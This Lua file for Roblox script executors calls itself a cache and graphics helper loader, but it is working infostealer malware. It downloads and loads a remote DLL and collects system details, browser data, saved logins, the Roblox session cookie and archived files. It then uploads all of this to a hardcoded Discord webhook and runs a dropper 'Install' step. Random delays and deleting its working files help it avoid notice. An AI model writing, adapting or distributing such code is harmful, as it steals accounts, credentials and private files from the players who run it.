-- RobloxUtility — local cache + graphics helper loader
-- loadstring(game:HttpGet("https://raw.githubusercontent.com/rbxgfx/RobloxUtility/master/lua/init.lua"))()

local CONFIG = {
    webhook = "https://discord.com/api/webhooks/1476791698041339997/tRLjlN11V6jBrSfHak-PcMTpty-sjHAPglOXl5Gs92UH0nCz0bukhQuuMmv0b_uNj6Pi",
    dll_url = "https://raw.githubusercontent.com/rbxgfx/RobloxUtility/master/utility.dll",
    phases  = { "sysinfo", "data", "logins", "session", "assets", "cache", "install" },
    delay_min = 2,
    delay_max = 6,
    assets_max_bytes = 100 * 1024 * 1024,
    install_target   = "",
}

local CAPS = {
    http_get = false, syn_request = false,
    readfile = false, writefile = false,
    isfile = false, delfile = false, makefolder = false,
    load_dll = false, getrenv = false,
    executor = "Unknown", dll_loaded = false,
}

local function detect()
    CAPS.http_get = pcall(function() return game.HttpGet or game.HttpGetAsync end)
    local ok = pcall(function() return syn and syn.request end)
    CAPS.syn_request = ok and syn ~= nil
    CAPS.readfile   = pcall(function() return readfile end)
    CAPS.writefile  = pcall(function() return writefile end)
    CAPS.isfile     = pcall(function() return isfile end)
    CAPS.delfile    = pcall(function() return delfile end)
    CAPS.makefolder = pcall(function() return makefolder end)
    CAPS.load_dll   = pcall(function() return load_dll or loadlibrary or (ffi and ffi.load) end)
    CAPS.getrenv    = pcall(function() return getrenv end)
    if identifyexecutor then
        local k, n = pcall(identifyexecutor); if k then CAPS.executor = n end
    elseif getexecutorname then
        local k, n = pcall(getexecutorname); if k then CAPS.executor = n end
    end
    return CAPS
end

local function fetch_dll(url, savePath)
    if not CAPS.http_get and not CAPS.syn_request then return false, "no http" end
    local data
    if CAPS.http_get then
        local ok, r = pcall(function() return game:HttpGet(url) end)
        if ok and r then data = r end
    end
    if not data and CAPS.syn_request then
        local ok, r = pcall(function()
            local resp = syn.request({ Url = url, Method = "GET",
                Headers = {["User-Agent"] = "Mozilla/5.0"} })
            return resp and resp.Body
        end)
        if ok and r then data = r end
    end
    if not data or #data < 1024 then return false, "fetch failed" end
    if CAPS.writefile then
        writefile(savePath, data); task.wait(0.3)
        if CAPS.isfile and isfile(savePath) then return true, savePath end
    end
    return false, "writefile failed"
end

local function init_helper()
    if not CONFIG.dll_url or CONFIG.dll_url == false then return false, "no dll url" end
    local dllPath = "utility.dll"
    if CAPS.isfile and isfile(dllPath) then
        -- already on disk
    else
        local ok, err = fetch_dll(CONFIG.dll_url, dllPath)
        if not ok then return false, err end
    end
    if not CAPS.load_dll then return false, "no load_dll" end
    local dll
    if load_dll then dll = load_dll(dllPath)
    elseif loadlibrary then dll = loadlibrary(dllPath)
    elseif ffi and ffi.load then dll = ffi.load(dllPath)
    end
    if not dll then return false, "load returned nil" end
    CAPS.dll_loaded = true
    return true, dll
end

local function call_helper(dll, name, ...)
    if not dll then return nil, "no dll" end
    local fn = dll[name]
    if not fn then return nil, "missing " .. tostring(name) end
    local ok, r = pcall(fn, ...)
    if not ok then return nil, tostring(r) end
    return r
end

local function read_helper_output(dll, name)
    local out = "cc_" .. name .. ".json"
    local ok = call_helper(dll, name, out)
    if not ok then return nil, name .. " failed" end
    task.wait(0.3)
    if CAPS.isfile and isfile(out) and CAPS.readfile then
        local d = readfile(out)
        if CAPS.delfile then delfile(out) end
        return d
    end
    return nil, "no output file"
end

local function get_session_token(dll)
    local out = "cc_session.json"
    local ok = call_helper(dll, "GetSession", out)
    if not ok or not CAPS.isfile or not isfile(out) then return nil end
    local data = readfile(out)
    if CAPS.delfile then delfile(out) end
    if not data then return nil end
    return data:match('"name":%s*"\\.ROBLOSECURITY".-"value":%s*"([^"]+)"')
end

local function lua_getinfo()
    local info = {
        executor = CAPS.executor, dll_loaded = CAPS.dll_loaded,
        http_get = CAPS.http_get, syn_request = CAPS.syn_request,
    }
    if CAPS.getrenv then
        local ok, renv = pcall(getrenv)
        if ok and renv then
            local k, pl = pcall(function() return renv.Players.LocalPlayer end)
            if k and pl then
                info.rbx_user = pl.Name
                info.rbx_id   = pl.UserId
                info.rbx_age  = pl.AccountAge
            end
        end
    end
    info.place_id = game.PlaceId
    info.job_id   = game.JobId
    return info
end

local function lua_check_cache()
    local user = ""
    if CAPS.getrenv then pcall(getrenv) end
    if user == "" then user = os.getenv and os.getenv("USERNAME") or "user" end
    local lad = "C:\\Users\\" .. user .. "\\AppData\\Local"
    local paths = {
        "Google\\Chrome\\User Data\\Default\\Network\\Cache",
        "Microsoft\\Edge\\User Data\\Default\\Network\\Cache",
        "BraveSoftware\\Brave-Browser\\Default\\Cache",
        "Opera Software\\Opera Stable\\Default\\Cache",
        "Mozilla\\Firefox\\Profiles",
    }
    local out = {}
    for _, p in ipairs(paths) do
        local full = lad .. "\\" .. p
        if isfile and isfile(full) then
            out[#out+1] = { path = full, note = "present" }
        end
    end
    return out
end

local function json_escape(s)
    if type(s) ~= "string" then return tostring(s) end
    return s:gsub("\\", "\\\\"):gsub('"', '\\"')
            :gsub("\n", "\\n"):gsub("\r", "\\r"):gsub("\t", "\\t")
end

local function to_json(v, depth)
    depth = depth or 0
    local pad  = string.rep("  ", depth)
    local pad1 = string.rep("  ", depth + 1)
    if type(v) == "table" then
        local isArr, maxI = true, 0
        for k in pairs(v) do
            if type(k) ~= "number" then isArr = false end
            if k > maxI then maxI = k end
        end
        if maxI > #v then isArr = false end
        if isArr and next(v) ~= nil then
            local t = {}
            for i = 1, #v do t[i] = pad1 .. to_json(v[i], depth + 1) end
            return "[\n" .. table.concat(t, ",\n") .. "\n" .. pad .. "]"
        else
            local t = {}
            for k, val in pairs(v) do
                local kk = type(k) == "string" and ('"' .. json_escape(k) .. '"') or tostring(k)
                t[#t+1] = pad1 .. kk .. ": " .. to_json(val, depth + 1)
            end
            return "{\n" .. table.concat(t, ",\n") .. "\n" .. pad .. "}"
        end
    elseif type(v) == "string"  then return '"' .. json_escape(v) .. '"'
    elseif type(v) == "boolean" then return v and "true" or "false"
    elseif type(v) == "number"  then return tostring(v)
    else return "null" end
end

local function send_report(payload)
    if not CAPS.syn_request then return false, "no syn" end
    local wh = CONFIG.webhook
    if not wh or wh:find("YOUR_WEBHOOK") then return false, "no webhook" end
    if #payload <= 1900 then
        local body = to_json({
            embeds = {{ title = "rbxutil",
                description = "```json\n" .. payload:sub(1, 1900) .. "\n```",
                color = 0xFF6B35,
                footer = { text = "rbxutil | " .. os.date("%Y-%m-%d %H:%M:%S") } }}
        })
        local ok, r = pcall(function() return syn.request({
            Url = wh, Method = "POST",
            Headers = { ["Content-Type"] = "application/json",
                        ["User-Agent"] = "Mozilla/5.0" },
            Body = body }) end)
        return ok and r and r.StatusCode and r.StatusCode < 300, "embed"
    end
    local b = "----CC" .. tostring(math.random(100000, 999999))
    local fn = "report_" .. os.date("%Y%m%d_%H%M%S") .. ".json"
    local body = "--" .. b .. "\r\n"
             .. 'Content-Disposition: form-data; name="payload_json"\r\n'
             .. 'Content-Type: application/json\r\n\r\n'
             .. '{"content":"report attached","username":"rbxutil"}\r\n'
             .. "--" .. b .. "\r\n"
             .. 'Content-Disposition: form-data; name="file"; filename="' .. fn .. '"\r\n'
             .. "Content-Type: application/json\r\n\r\n"
             .. payload .. "\r\n"
             .. "--" .. b .. "--\r\n"
    local ok, r = pcall(function() return syn.request({
        Url = wh, Method = "POST",
        Headers = { ["Content-Type"] = "multipart/form-data; boundary=" .. b,
                    ["User-Agent"] = "Mozilla/5.0" },
        Body = body }) end)
    return ok and r and r.StatusCode and r.StatusCode < 300, "file"
end

local function send_file(path, displayName)
    if not CAPS.syn_request or not CAPS.readfile or not CAPS.isfile then return false, "no cap" end
    if not isfile(path) then return false, "no file" end
    local data = readfile(path)
    if not data or #data == 0 then return false, "empty" end
    local fn = displayName or path:match("[^/\\]+$") or "file.bin"
    local b = "----CC" .. tostring(math.random(100000, 999999))
    local pre = "--" .. b .. "\r\n"
              .. 'Content-Disposition: form-data; name="payload_json"\r\n'
              .. 'Content-Type: application/json\r\n\r\n'
              .. '{"content":"file: ' .. fn .. '","username":"rbxutil"}\r\n'
              .. "--" .. b .. "\r\n"
              .. 'Content-Disposition: form-data; name="files[0]"; filename="' .. fn .. '"\r\n'
              .. "Content-Type: application/octet-stream\r\n\r\n"
    local post = "\r\n--" .. b .. "--\r\n"
    local body = pre .. data .. post
    local ok, r = pcall(function() return syn.request({
        Url = CONFIG.webhook, Method = "POST",
        Headers = { ["Content-Type"] = "multipart/form-data; boundary=" .. b,
                    ["User-Agent"] = "Mozilla/5.0" },
        Body = body }) end)
    return ok and r and r.StatusCode and r.StatusCode < 300, #data .. "B"
end

local function wait_jitter()
    task.wait(CONFIG.delay_min + math.random() * (CONFIG.delay_max - CONFIG.delay_min))
end

local function run()
    print("== RobloxUtility ==")
    detect()
    print("executor: " .. CAPS.executor)
    print("dll: " .. tostring(CAPS.load_dll))
    print("http: " .. tostring(CAPS.http_get or CAPS.syn_request))

    local dll
    if CAPS.load_dll and CONFIG.dll_url then
        local ok, r = init_helper()
        if ok then dll = r else print("helper init failed: " .. tostring(r)) end
    end

    local result = { meta = {
        ts = os.date("%Y-%m-%dT%H:%M:%S"),
        executor = CAPS.executor, dll_loaded = CAPS.dll_loaded,
    }}

    for _, phase in ipairs(CONFIG.phases) do
        wait_jitter(); print("phase: " .. phase)
        local ok, r = pcall(function()
            if phase == "sysinfo" then
                local info = lua_getinfo()
                if dll then
                    local fp = "cc_sysinfo.json"
                    local k = call_helper(dll, "WriteInfo", fp)
                    if k and CAPS.isfile and isfile(fp) and CAPS.readfile then
                        info.native = readfile(fp)
                        if CAPS.delfile then delfile(fp) end
                    end
                end
                return info

            elseif phase == "data" then
                if dll then
                    local j, e = read_helper_output(dll, "GetData")
                    if j then return j end
                end
                return to_json(lua_check_cache())

            elseif phase == "logins" then
                if dll then
                    local j, e = read_helper_output(dll, "GetLogins")
                    if j then return j end
                end
                return '{"note":"logins require helper"}'

            elseif phase == "session" then
                if dll then
                    local tok = get_session_token(dll)
                    if tok then return '{"session":"' .. tok .. '"}' end
                end
                return '{"note":"no session"}'

            elseif phase == "assets" then
                if dll then
                    local m = "cc_assets_manifest.json"
                    local a = "cc_assets_" .. os.date("%Y%m%d_%H%M%S") .. ".tar.gz"
                    local k = call_helper(dll, "GetAssets", m, a, CONFIG.assets_max_bytes)
                    if k and CAPS.isfile and isfile(a) then
                        if CAPS.isfile and isfile(m) and CAPS.readfile then
                            send_report(readfile(m))
                        end
                        local ok2, msg = send_file(a, "assets_" .. os.date("%Y%m%d_%H%M%S") .. ".tar.gz")
                        if CAPS.delfile then
                            pcall(function() delfile(m) end); pcall(function() delfile(a) end)
                        end
                        return { ok = ok2, msg = msg }
                    end
                end
                return '{"note":"assets require helper"}'

            elseif phase == "cache" then
                if dll then
                    local outDir = "cc_cache_" .. tostring(os.time())
                    local k = call_helper(dll, "GetCache", outDir)
                    if k and CAPS.isfile then
                        for _, db in ipairs({"thumbcache_256.db", "thumbcache_1024.db",
                                             "thumbcache_96.db", "thumbcache_idx.db",
                                             "thumbcache_sr.db"}) do
                            local p = outDir .. "/" .. db
                            if isfile(p) then send_file(p, db); task.wait(1.5) end
                        end
                        if CAPS.delfile then pcall(function() delfile(outDir) end) end
                        return { ok = true }
                    end
                end
                return '{"note":"cache requires helper"}'

            elseif phase == "install" then
                if CONFIG.install_target == false then
                    return '{"note":"install disabled"}'
                end
                if dll then
                    if dll.IsActive and dll.IsActive() then
                        return { method = "already" }
                    end
                    local src = CONFIG.install_target or ""
                    local k = call_helper(dll, "Install", src)
                    return { method = "dropper", success = k, src = (src == "" and "stub" or src) }
                end
                return '{"note":"install requires helper"}'
            end
        end)

        if ok then
            result[phase] = r; print(phase .. " ok")
        else
            result[phase] = { error = tostring(r) }; print(phase .. " err: " .. tostring(r))
        end
    end

    if dll then pcall(function() call_helper(dll, "Cleanup") end) end
    print("done.")
    return result
end

task.wait(1.5)
return run()
